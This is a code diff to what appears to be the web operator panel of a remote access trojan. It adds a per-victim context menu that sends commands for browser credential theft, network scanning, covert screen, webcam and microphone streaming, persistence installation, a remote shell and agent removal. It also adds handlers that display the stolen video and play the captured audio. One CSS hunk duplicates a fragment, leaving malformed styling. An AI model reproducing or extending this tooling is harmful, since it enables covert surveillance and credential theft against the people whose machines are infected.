@@ -141,6 +141,27 @@
   .term-bar{padding:10px 16px;background:rgba(255,255,255,.04);border-bottom:1px solid var(--border);
     display:flex;align-items:center;gap:8px}
   .term-dot{width:10px;height:10px;border-radius:50%}
+
+  /* ─── Context Menu ─── */
+  #ctx-menu {
+    position: fixed; z-index: 9999; background: var(--bg1); backdrop-filter: blur(var(--blur));
+    border: 1px solid var(--border); border-radius: 12px; min-width: 220px;
+    box-shadow: 0 10px 40px rgba(0,0,0,0.8), 0 0 15px rgba(212,175,55,0.1); display: none;
+    flex-direction: column; padding: 8px; overflow: hidden;
+  }
+  #ctx-menu.show { display: flex; animation: fadeUp .2s ease }
+  .ctx-item {
+    padding: 10px 16px; font-size: .85rem; color: var(--text); border-radius: 6px;
+    cursor: pointer; display: flex; align-items: center; gap: 8px; transition: .2s;
+  }
+  .ctx-item:hover { background: var(--gold-dim); color: var(--gold); }
+  .ctx-item.danger { color: var(--red); }
+  .ctx-item.danger:hover { background: rgba(255,74,107,.15); }
+  .ctx-divider { height: 1px; background: rgba(255,255,255,.05); margin: 6px 0; }
+  .ctx-header { padding: 8px 16px; font-size: .7rem; letter-spacing: 2px; text-transform: uppercase; color: var(--text-dim); }
+
+    display:flex;align-items:center;gap:8px}
+  .term-dot{width:10px;height:10px;border-radius:50%}
   .term-body{padding:14px 18px;height:220px;overflow-y:auto;color:#a0f0a0;line-height:1.7}
   .term-inp-row{display:flex;align-items:center;gap:0;padding:8px 18px;border-top:1px solid var(--border)}
   .term-prompt{color:var(--gold);white-space:nowrap;font-family:var(--mono)}
@@ -394,6 +415,24 @@
 
     </div><!-- content -->
   </main>
+</div><!-- CONTEXT MENU -->
+<div id="ctx-menu" onclick="event.stopPropagation()">
+  <div class="ctx-header" id="ctx-target">AGENT ID</div>
+  <div class="ctx-item" onclick="ctxCmd('info')">⚙️ SysInfo</div>
+  <div class="ctx-item" onclick="ctxCmd('browsers')">🔑 Browser Creds</div>
+  <div class="ctx-item" onclick="ctxCmd('netscan')">🌐 NetScan</div>
+  <div class="ctx-divider"></div>
+  <div class="ctx-header">Streams</div>
+  <div class="ctx-item" onclick="ctxCmd('screen_start')">🖥 View Screen</div>
+  <div class="ctx-item" onclick="ctxCmd('webcam_start')">📷 View Webcam</div>
+  <div class="ctx-item" onclick="ctxCmd('audio_start')">🔊 Listen Audio</div>
+  <div class="ctx-divider"></div>
+  <div class="ctx-header">Actions</div>
+  <div class="ctx-item" onclick="ctxCmd('persist_install')">🛡️ Install Persist</div>
+  <div class="ctx-item" onclick="openAgent(SELECTED_CID); hideCtx()">💻 Open Shell / Terminal</div>
+  <div class="ctx-divider"></div>
+  <div class="ctx-item danger" onclick="ctxCmd('kill')">☠️ Kill Process</div>
+  <div class="ctx-item danger" onclick="ctxCmd('uninstall')">🗑️ Uninstall Agent</div>
 </div>
 
 <!-- MODAL -->
@@ -519,8 +558,11 @@ function clientRow(cid, c, cols) {
   const pill = on
     ? '<span class="pill pill-green"><span class="pill-dot"></span>Online</span>'
     : '<span class="pill pill-red"><span class="pill-dot"></span>Offline</span>';
+  
+  const trStart = `<tr oncontextmenu="showContextMenu(event, '${cid}')" style="cursor:context-menu">`;
+  
   if (cols === 7) {
-    return `<tr>
+    return `${trStart}
       <td class="cid">${cid.substring(0,12)}…</td>
       <td>${c.hostname||'—'}</td>
       <td>${(c.os||'').substring(0,30)}</td>
@@ -530,7 +572,7 @@ function clientRow(cid, c, cols) {
       <td><button class="btn btn-gold btn-sm" onclick="openAgent('${cid}')">Control ›</button></td>
     </tr>`;
   }
-  return `<tr>
+  return `${trStart}
     <td class="cid">${cid.substring(0,12)}…</td>
     <td>${c.hostname||'—'}</td>
     <td>${(c.os||'').substring(0,25)}</td>
@@ -641,7 +683,45 @@ async function sendCommand(payload) {
     body: JSON.stringify({cid: SELECTED_CID, cmd: payload})
   });
   if (r && r.ok) appendOut(document.getElementById('agent-out'), `[Sent: ${payload.action}]`, '#5b9fff');
+  
+  if (['screen_start', 'webcam_start', 'audio_start'].includes(payload.action)) {
+    document.getElementById('stream-cid').value = SELECTED_CID;
+    nav(document.querySelector('[data-page="streams"]'), 'streams');
+  }
 }
+
+// ── Context Menu
+function showContextMenu(e, cid) {
+  e.preventDefault();
+  SELECTED_CID = cid;
+  const menu = document.getElementById('ctx-menu');
+  document.getElementById('ctx-target').textContent = (CLIENTS[cid]?.hostname || cid).substring(0, 16);
+  menu.classList.add('show');
+  
+  let x = e.clientX;
+  let y = e.clientY;
+  const mx = window.innerWidth - menu.offsetWidth - 10;
+  const my = window.innerHeight - menu.offsetHeight - 10;
+  if(x > mx) x = mx;
+  if(y > my) y = my;
+  menu.style.left = x + 'px';
+  menu.style.top = y + 'px';
+}
+
+function hideCtx() {
+  document.getElementById('ctx-menu').classList.remove('show');
+}
+document.addEventListener('click', hideCtx);
+document.addEventListener('contextmenu', (e) => {
+  if(!e.target.closest('tr')) hideCtx();
+});
+
+async function ctxCmd(action) {
+  hideCtx();
+  if(!SELECTED_CID) return;
+  await sendCommand({action});
+}
+
 
 function appendOut(el, text, color='#a0f0a0') {
   if (!el) return;
@@ -756,14 +836,30 @@ function initSocket() {
   try {
     socket = io({auth:{token:TOKEN}});
     socket.emit('auth', {token:TOKEN});
-    socket.on('screen_frame', d => {
-      const el = document.getElementById('screen-frame');
-      el.innerHTML = `<img src="data:image/jpeg;base64,${d.data}" style="width:100%;height:100%;object-fit:contain">`;
+    
+    let audioCtx = null;
+    
+    socket.on('stream_frame', d => {
+      if (d.type === 'screen') {
+          const el = document.getElementById('screen-frame');
+          if (el) el.innerHTML = `<img src="data:image/jpeg;base64,${d.data}" style="width:100%;height:100%;object-fit:contain">`;
+      } else if (d.type === 'webcam') {
+          const el = document.getElementById('webcam-frame');
+          if (el) el.innerHTML = `<img src="data:image/jpeg;base64,${d.data}" style="width:100%;height:100%;object-fit:contain">`;
+      }
     });
-    socket.on('webcam_frame', d => {
-      const el = document.getElementById('webcam-frame');
-      el.innerHTML = `<img src="data:image/jpeg;base64,${d.data}" style="width:100%;height:100%;object-fit:contain">`;
+    
+    socket.on('audio_chunk', async d => {
+      try {
+        if(!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        if(audioCtx.state === 'suspended') await audioCtx.resume();
+        const binary = atob(d.data); const len = binary.length; const bytes = new Uint8Array(len);
+        for (let i=0; i<len; i++) bytes[i] = binary.charCodeAt(i);
+        const aBuf = await audioCtx.decodeAudioData(bytes.buffer);
+        const src = audioCtx.createBufferSource(); src.buffer = aBuf; src.connect(audioCtx.destination); src.start(0);
+      } catch(e) { console.error("Audio play error", e); }
     });
+
     socket.on('result', d => {
       const el = document.getElementById('agent-out');
       if (el && d.cid === SELECTED_CID) appendOut(el, `[${d.type}] ${JSON.stringify(d.data||'').substring(0,300)}`);
